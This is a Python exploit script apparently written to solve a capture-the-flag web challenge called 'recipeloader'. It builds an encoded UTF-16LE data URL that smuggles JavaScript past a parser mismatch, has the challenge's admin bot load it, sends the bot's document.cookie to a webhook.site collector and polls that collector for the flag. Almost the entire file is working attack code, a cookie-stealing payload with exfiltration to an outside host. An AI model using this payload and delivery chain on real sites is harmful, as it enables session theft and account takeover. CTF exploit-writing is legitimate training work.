#!/usr/bin/env python3
import argparse
import base64
import sys
import time
import urllib.parse

import requests


def build_data_url(webhook_url: str) -> str:
    payload_core = f'=0;(new Image).src="{webhook_url}?c="+encodeURIComponent(document.cookie);/*'
    trailer = "re\\u0063ipe = ``"
    raw = b"<!--" + payload_core.encode("utf-16le") + b"*/\n" + trailer.encode()
    return "data:text/javascript;charset=utf-16le;base64," + base64.b64encode(raw).decode()


def build_bot_url(instance: str, webhook_url: str) -> str:
    data_url = build_data_url(webhook_url)
    inner = "http://localhost:1337/?url=" + urllib.parse.quote(data_url, safe="")
    return instance.rstrip("/") + "/bot/run?url=" + urllib.parse.quote(inner, safe="")


def trigger(instance: str, webhook_url: str) -> None:
    bot_url = build_bot_url(instance, webhook_url)
    res = requests.get(bot_url, timeout=30)
    res.raise_for_status()
    print(f"[+] bot response: {res.text.strip()}")


def poll_flag(token: str, timeout: int) -> str | None:
    api = f"https://webhook.site/token/{token}/requests"
    deadline = time.time() + timeout
    while time.time() < deadline:
        res = requests.get(api, timeout=20)
        res.raise_for_status()
        data = res.json().get("data", [])
        for entry in data:
            url = entry.get("url", "")
            if "?c=flag" not in url:
                continue
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            cookie = qs.get("c", [""])[0]
            if cookie.startswith("flag"):
                return cookie[4:]
        time.sleep(2)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit recipeloader via UTF-16LE data URL parser mismatch")
    parser.add_argument("instance", help="challenge base URL, contoh: https://steamed-tiramisu-dusted-with-shaved-beans-itaj.gpn24.ctf.kitctf.de")
    parser.add_argument("webhook_token", help="token webhook.site")
    parser.add_argument("--timeout", type=int, default=30, help="poll timeout in seconds")
    args = parser.parse_args()

    webhook_url = f"https://webhook.site/{args.webhook_token}"

    print(f"[+] instance : {args.instance}")
    print(f"[+] webhook  : {webhook_url}")
    trigger(args.instance, webhook_url)

    print("[+] waiting for bot callback...")
    flag = poll_flag(args.webhook_token, args.timeout)
    if not flag:
        print("[-] no flag callback received", file=sys.stderr)
        return 1

    print(f"[+] flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
